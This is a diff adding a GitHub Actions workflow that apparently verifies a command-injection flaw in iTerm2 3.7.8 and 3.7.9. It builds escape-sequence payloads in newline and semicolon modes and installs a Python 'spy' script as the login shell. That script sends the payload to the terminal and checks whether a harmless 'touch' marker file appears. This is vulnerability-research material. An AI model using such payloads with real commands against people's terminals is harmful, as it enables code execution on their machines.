@@ -1,0 +1,855 @@
+name: macos-verify5
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-verify5.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+  spy-378-nl:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "newline"
+      MARKER: "SPY_378_NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "SPY_378_NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          echo "--- payload file ---"
+          od -c /tmp/payload.md | head -6
+          echo "--- decoded path ---"
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print(repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(no APC)')"
+
+      - name: Install spy as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SPYEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback, binascii
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== spy started pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  tty = os.ttyname(0)
+              except Exception:
+                  tty = "NOT_A_TTY"
+              log("tty=%s" % tty)
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 吐 payload 到终端输出
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  n = os.write(1, payload)
+                  log("payload written: %d bytes" % n)
+              except Exception as e:
+                  log("payload write failed: %r" % (e,))
+                  payload = b""
+
+              # 给 iTerm2 时间处理 APC 并写响应
+              time.sleep(2)
+
+              # 非阻塞，累积读 8 秒
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              buf = b""
+              chunks = 0
+              deadline = time.time() + 8
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      buf += d
+                      chunks += 1
+                      log("chunk %d: %d bytes (total %d)" % (chunks, len(d), len(buf)))
+
+              log("TOTAL captured %d bytes in %d chunks" % (len(buf), chunks))
+
+              try:
+                  with open("/tmp/captured.bin", "wb") as f:
+                      f.write(buf)
+                  with open("/tmp/captured.hex", "w") as f:
+                      f.write(buf.hex())
+                  # 逐行拆解，方便人看
+                  with open("/tmp/decoded.txt", "w") as f:
+                      f.write("RAW HEX:\n%s\n\n" % buf.hex())
+                      f.write("ESCAPED:\n%s\n\n" % repr(buf))
+                      try:
+                          txt = buf.decode("utf-8", "replace")
+                          f.write("AS TEXT (lines):\n")
+                          for i, line in enumerate(txt.split("\n")):
+                              f.write("  [%d] %r\n" % (i, line))
+                      except Exception:
+                          pass
+              except Exception as e:
+                  log("dump failed: %r" % (e,))
+
+              # marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  log("MARKER_PRESENT: " + marker if os.path.exists(marker) else "MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== spy done, exec bash ===")
+              os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          SPYEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          head -2 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 5
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT spy-378-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- decoded.txt ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_DECODE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev5-spy-378-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
+  spy-378-semi:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "semicolon"
+      MARKER: "SPY_378_S"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "SPY_378_S" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          echo "--- payload file ---"
+          od -c /tmp/payload.md | head -6
+          echo "--- decoded path ---"
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print(repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(no APC)')"
+
+      - name: Install spy as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SPYEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback, binascii
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== spy started pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  tty = os.ttyname(0)
+              except Exception:
+                  tty = "NOT_A_TTY"
+              log("tty=%s" % tty)
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 吐 payload 到终端输出
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  n = os.write(1, payload)
+                  log("payload written: %d bytes" % n)
+              except Exception as e:
+                  log("payload write failed: %r" % (e,))
+                  payload = b""
+
+              # 给 iTerm2 时间处理 APC 并写响应
+              time.sleep(2)
+
+              # 非阻塞，累积读 8 秒
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              buf = b""
+              chunks = 0
+              deadline = time.time() + 8
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      buf += d
+                      chunks += 1
+                      log("chunk %d: %d bytes (total %d)" % (chunks, len(d), len(buf)))
+
+              log("TOTAL captured %d bytes in %d chunks" % (len(buf), chunks))
+
+              try:
+                  with open("/tmp/captured.bin", "wb") as f:
+                      f.write(buf)
+                  with open("/tmp/captured.hex", "w") as f:
+                      f.write(buf.hex())
+                  # 逐行拆解，方便人看
+                  with open("/tmp/decoded.txt", "w") as f:
+                      f.write("RAW HEX:\n%s\n\n" % buf.hex())
+                      f.write("ESCAPED:\n%s\n\n" % repr(buf))
+                      try:
+                          txt = buf.decode("utf-8", "replace")
+                          f.write("AS TEXT (lines):\n")
+                          for i, line in enumerate(txt.split("\n")):
+                              f.write("  [%d] %r\n" % (i, line))
+                      except Exception:
+                          pass
+              except Exception as e:
+                  log("dump failed: %r" % (e,))
+
+              # marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  log("MARKER_PRESENT: " + marker if os.path.exists(marker) else "MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== spy done, exec bash ===")
+              os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          SPYEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          head -2 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 5
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT spy-378-semi ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- decoded.txt ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_DECODE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev5-spy-378-semi
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
+  spy-379-nl:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "newline"
+      MARKER: "SPY_379_NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "SPY_379_NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          echo "--- payload file ---"
+          od -c /tmp/payload.md | head -6
+          echo "--- decoded path ---"
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print(repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(no APC)')"
+
+      - name: Install spy as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SPYEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback, binascii
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== spy started pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  tty = os.ttyname(0)
+              except Exception:
+                  tty = "NOT_A_TTY"
+              log("tty=%s" % tty)
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 吐 payload 到终端输出
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  n = os.write(1, payload)
+                  log("payload written: %d bytes" % n)
+              except Exception as e:
+                  log("payload write failed: %r" % (e,))
+                  payload = b""
+
+              # 给 iTerm2 时间处理 APC 并写响应
+              time.sleep(2)
+
+              # 非阻塞，累积读 8 秒
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              buf = b""
+              chunks = 0
+              deadline = time.time() + 8
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      buf += d
+                      chunks += 1
+                      log("chunk %d: %d bytes (total %d)" % (chunks, len(d), len(buf)))
+
+              log("TOTAL captured %d bytes in %d chunks" % (len(buf), chunks))
+
+              try:
+                  with open("/tmp/captured.bin", "wb") as f:
+                      f.write(buf)
+                  with open("/tmp/captured.hex", "w") as f:
+                      f.write(buf.hex())
+                  # 逐行拆解，方便人看
+                  with open("/tmp/decoded.txt", "w") as f:
+                      f.write("RAW HEX:\n%s\n\n" % buf.hex())
+                      f.write("ESCAPED:\n%s\n\n" % repr(buf))
+                      try:
+                          txt = buf.decode("utf-8", "replace")
+                          f.write("AS TEXT (lines):\n")
+                          for i, line in enumerate(txt.split("\n")):
+                              f.write("  [%d] %r\n" % (i, line))
+                      except Exception:
+                          pass
+              except Exception as e:
+                  log("dump failed: %r" % (e,))
+
+              # marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  log("MARKER_PRESENT: " + marker if os.path.exists(marker) else "MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== spy done, exec bash ===")
+              os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          SPYEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          head -2 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 5
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT spy-379-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- decoded.txt ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_DECODE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev5-spy-379-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
+  spy-379-semi:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "semicolon"
+      MARKER: "SPY_379_S"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "SPY_379_S" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $HOME/$MARKER" --out /tmp/payload.md
+          echo "--- payload file ---"
+          od -c /tmp/payload.md | head -6
+          echo "--- decoded path ---"
+          python3 -c "import base64,re;raw=open('/tmp/payload.md','rb').read();m=re.search(rb'i=1;([A-Za-z0-9+/=]+)',raw);print(repr(base64.b64decode(m.group(1)).decode('utf-8')) if m else '(no APC)')"
+
+      - name: Install spy as login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SPYEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback, binascii
+
+          LOG = "/tmp/lsh.log"
+
+          def log(m):
+              try:
+                  with open(LOG, "a") as f:
+                      f.write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== spy started pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
+              try:
+                  tty = os.ttyname(0)
+              except Exception:
+                  tty = "NOT_A_TTY"
+              log("tty=%s" % tty)
+
+              # 等 iTerm2 准备好
+              time.sleep(2)
+
+              # 吐 payload 到终端输出
+              try:
+                  with open("/tmp/payload.md", "rb") as f:
+                      payload = f.read()
+                  n = os.write(1, payload)
+                  log("payload written: %d bytes" % n)
+              except Exception as e:
+                  log("payload write failed: %r" % (e,))
+                  payload = b""
+
+              # 给 iTerm2 时间处理 APC 并写响应
+              time.sleep(2)
+
+              # 非阻塞，累积读 8 秒
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception as e:
+                  log("fcntl failed: %r" % (e,))
+
+              buf = b""
+              chunks = 0
+              deadline = time.time() + 8
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception as e:
+                      log("select failed: %r" % (e,))
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      buf += d
+                      chunks += 1
+                      log("chunk %d: %d bytes (total %d)" % (chunks, len(d), len(buf)))
+
+              log("TOTAL captured %d bytes in %d chunks" % (len(buf), chunks))
+
+              try:
+                  with open("/tmp/captured.bin", "wb") as f:
+                      f.write(buf)
+                  with open("/tmp/captured.hex", "w") as f:
+                      f.write(buf.hex())
+                  # 逐行拆解，方便人看
+                  with open("/tmp/decoded.txt", "w") as f:
+                      f.write("RAW HEX:\n%s\n\n" % buf.hex())
+                      f.write("ESCAPED:\n%s\n\n" % repr(buf))
+                      try:
+                          txt = buf.decode("utf-8", "replace")
+                          f.write("AS TEXT (lines):\n")
+                          for i, line in enumerate(txt.split("\n")):
+                              f.write("  [%d] %r\n" % (i, line))
+                      except Exception:
+                          pass
+              except Exception as e:
+                  log("dump failed: %r" % (e,))
+
+              # marker 检查
+              try:
+                  name = open("/tmp/marker_name").read().strip()
+                  marker = os.path.join(os.path.expanduser("~"), name)
+                  log("MARKER_PRESENT: " + marker if os.path.exists(marker) else "MARKER_ABSENT: " + marker)
+              except Exception as e:
+                  log("marker check failed: %r" % (e,))
+
+              log("=== spy done, exec bash ===")
+              os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  os.execv("/bin/bash", ["/bin/bash", "-l"])
+
+          SPYEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          head -2 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt
+
+      - name: Launch
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 16); do
+            sleep 5
+            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
+          done
+          sleep 5
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT spy-379-semi ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- decoded.txt ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_DECODE"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev5-spy-379-semi
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/captured.bin
+            /tmp/captured.hex
+            /tmp/decoded.txt
+            /tmp/shot.png
+          if-no-files-found: warn
